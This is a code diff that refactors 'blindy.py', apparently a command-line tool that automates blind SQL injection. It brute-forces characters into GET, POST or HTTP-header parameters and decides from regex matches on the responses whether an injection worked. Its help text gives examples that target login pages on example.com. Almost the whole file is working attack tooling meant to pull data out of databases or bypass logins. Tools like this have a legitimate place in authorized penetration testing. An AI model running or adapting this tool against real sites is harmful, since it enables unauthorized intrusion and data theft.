@@ -7,7 +7,6 @@ from urllib.parse import quote_plus as urlencode
 NOTIN_PLACEHOLDER = 'NOTIN'
 BRUTE_CHAR_PLACEHOLDER = '{}'
 
-finish = False
 chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
 notin = ['information_schema', 'mysql', 'performance_schema', 'sys']
 
@@ -21,8 +20,7 @@ def createBruteQuery(word, query):
 
 
 def createWord(word, char):
-    something = word + char
-    return something
+    return word + char
 
 
 def substitutePlaceholders(query):
@@ -49,7 +47,6 @@ def inGETrequest(payload, url):
 
     return r.text
 
-
 def preparePayload(parameters, phrase, encode):
     payload = {}
 
@@ -57,95 +54,97 @@ def preparePayload(parameters, phrase, encode):
 
         if (re.search('=', param)):
 
-            p = re.split("=", param)
-            if re.search(BRUTE_CHAR_PLACEHOLDER, p[1]):
-                newParam = re.sub(BRUTE_CHAR_PLACEHOLDER, phrase, p[1])
+            param_splitted = re.split("=", param)
+            if re.search(BRUTE_CHAR_PLACEHOLDER, param_splitted[1]):
+                newParam = re.sub(BRUTE_CHAR_PLACEHOLDER, phrase, param_splitted[1])
             else:
-                newParam = p[1]
+                newParam = param_splitted[1]
 
-            payload[p[0]] = newParam
+            payload[param_splitted[0]] = urlencode(newParam) if encode == True else newParam
 
         else:
-
             payload[param] = urlencode(phrase) if encode == True else phrase
 
     return payload
 
 
-def bruteforce(parameters, word, phrase, url, callback, negativePattern, encode):
-    global finish
-    index = 0
+def bruteforce(parameters, word, phrase, url, callback, pattern, positive, encode):
 
     if not re.search(BRUTE_CHAR_PLACEHOLDER, phrase):
         payload = preparePayload(parameters, phrase, encode)
-        return callback(payload, url)
+        r = callback(payload, url)
+        result = pattern.search(r)
+        if (positive and result) or (not positive and not result):
+            message = '\nFound: {}'.format(result)
+            print(message)
+            return result.group()
 
     for char in chars:
 
-        wordCreated = createWord(word, char)
+        newWord = createWord(word, char)
         query = substitutePlaceholders(phrase)
-        brutequery = createBruteQuery(wordCreated, query)
-
+        brutequery = createBruteQuery(newWord, query)
         payload = preparePayload(parameters, brutequery, encode)
 
         r = callback(payload, url)
-        result = negativePattern.search(callback(payload, url))
+        result = pattern.search(r)
 
-        if not result:
-            bruteforce(parameters, wordCreated, phrase, url, callback, encode)
+        if (positive and result) or (not positive and not result):
+                return bruteforce(parameters, newWord, phrase, url, callback, pattern, positive, encode)
 
-        if index == len(chars) - 1:
-            message = '\nFound word: {}'.format(word) if word is not '' else 'Nothing found :('
-            print(message)
-            finish = True
-
-        if finish == True:
-            return r
-
-        index += 1
+    message = '\nFound: {}'.format(word) if word is not '' else 'Nothing found :('
+    print(message)
+    return word
 
 
-def runInjection(method, parameters, phrasesToTest, url, negativePattern, encode=True):
-    global finish
+
+def runInjection(method, parameters, phrasesToTest, url, pattern, positive, encode):
 
     for phrase in phrasesToTest:
 
-        finish = 0
         phrase = phrase.rstrip('\n')
         print('Testing: {}'.format(phrase))
-        queryResult = ''
 
         if method == 'POST':
-            queryResult = bruteforce(parameters, '', phrase, url, inPOSTrequest, negativePattern, encode)
+            bruteforce(parameters, '', phrase, url, inPOSTrequest, pattern, positive, encode)
 
         elif method == 'GET':
-            queryResult = bruteforce(parameters, '', phrase, url, inGETrequest, negativePattern, encode)
+            bruteforce(parameters, '', phrase, url, inGETrequest, pattern, positive, encode)
 
         elif method == 'HEADER':
-            queryResult = bruteforce(parameters, '', phrase, url, inHTTPheader, negativePattern, encode)
-
-        if not negativePattern.search(queryResult):
-            print(' ------------------ !!!! -------------------\n\n\n')
-            print('Pattern not found for phrase: \n{}\n\n\n'.format(phrase))
-            print(' ------------------ !!!! -------------------')
+            bruteforce(parameters, '', phrase, url, inHTTPheader, pattern, positive, encode)
 
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Run blind sql injection using brutforce")
-    parser.add_argument('-f', metavar='filename', default='default-queries.json', type=argparse.FileType('r'),
+def parseArguments():
+    parser = argparse.ArgumentParser(description="Run blind sql injection using brutforce",
+                                     formatter_class=argparse.RawDescriptionHelpFormatter, epilog='''
+    Example 1: python3 blindy.py -m POST -p query_param -p submit=1 -r \'Pattern\ to\ ignore\ result\' -u http://example.com/index.php -s blind
+    Example 2: python3 blindy.py -m POST -p "query_param=login {}" -p submit=1 -r \'Pattern\ to\ ignore\ result\' -u http://example.com/index.php -s blind
+    Example 3: python3 blindy.py -m POST -p username -p submit=1 -r 'Pattern\ to\ ignore\ result' -u http://example.com/login.php -s login
+    ''')
+    parser.add_argument('-f', '--filename', metavar='filename', default='default-queries.json',
+                        type=argparse.FileType('r'),
                         help='File name for your commands in json format, defaults to default-queries.json')
     parser.add_argument('-m', '--method', metavar='method',
                         help='Where to inject (GET - get parameter/default, POST - post parameter, HEADER - header)')
-    parser.add_argument('-p', metavar='name', required=True, action='append',
+    parser.add_argument('-p', '--parameter', metavar='name', required=True, action='append',
                         help='Name of parameter (for get - param name, post - param name, for header - name of header). If params need to have fixed value use -p submit=true')
-    parser.add_argument('-r', metavar='regexp', required=True,
-                        help='Regular expression for negative pattern (Pattern for failed injection attempt - script will print info if pattern is NOT present)')
-    parser.add_argument('-u', metavar='url', required=True, help='Url to test')
-    parser.add_argument('-s', '--set', metavar='set_of_queries', default='blind',
+    parser.add_argument('-r', '--pattern', metavar='pattern', required=True,
+                        help='Regular expression/pattern - may be negative or positive. This means if the result of the successfull injection is not known - you should set the negative pattern (the one that is present if the injection is not successfull)')
+    parser.add_argument('--positive', metavar='positive', action='store_const', const=True,
+                        help='--positive means script will assume injection was successfull if pattern IS PRESENT in response. If you don\'t know what will appear in the response when the injection was successful, please do not use this flag and script will look for negative pattern.')
+    parser.add_argument('-u', '--url', metavar='url', required=True, help='Url to test')
+    parser.add_argument('-s', '--query_set', metavar='set_of_queries', default='blind',
                         help='Which set of queries to analyze from json file, for ex. login, blind. Default to blind.')
-
+    parser.add_argument('-e', '--encode', metavar='encode', action='store_const', const=True, help='Url encode payload')
     args = parser.parse_args()
 
-    jsonParsed = json.load(args.f)
+    return args
 
-    runInjection(args.method, args.p, jsonParsed[args.set], negativePattern = re.compile(args.r), encode=args.u)
+
+if __name__ == "__main__":
+    args = parseArguments()
+    
+    jsonParsed = json.load(args.filename)
+
+    runInjection(args.method, args.parameter, jsonParsed[args.query_set], args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
